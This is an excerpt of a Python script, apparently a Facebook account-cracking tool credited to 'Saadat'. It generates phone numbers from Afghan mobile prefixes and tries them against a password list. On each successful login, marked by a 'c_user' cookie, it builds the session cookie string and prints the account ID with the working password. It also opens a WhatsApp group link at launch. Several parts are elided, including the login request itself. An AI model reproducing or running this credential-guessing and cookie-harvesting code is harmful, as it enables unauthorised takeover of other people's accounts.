...
try:
	...
	os.system('xdg-open https://chat.whatsapp.com/+93702856593')
...
\033[1;39m 888   T88b  "Y8888P"  888    88
[+]═══════════════════════════════════════════
\033[1;37m[+] \033[1;37mCREATED BY   :  \033[1;37mSaadat
\033[1;37m[+] \033[1;37mON FACEBOK   :  \033[1;37mRazieequllah saadat
\033[1;37m[+] \033[1;37mON GITHUB    :  \033[1;37mAFGKhan1
...
def random_number1():
	...
	os.system('clear')
	print(logo)
	print('[√] EXAMPLE :9377,9378,9379,9370.ETC')
	print('[+]═══════════════════════════════════════════')
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[151:166]
				print('\033[1;92m[SaadatOK] '+cid+' | '+ps+'\033[1;32m')
...
def method3():
	...
	print('[+] Use Three Digit Code (9377,9370)')
	print(47*'-')
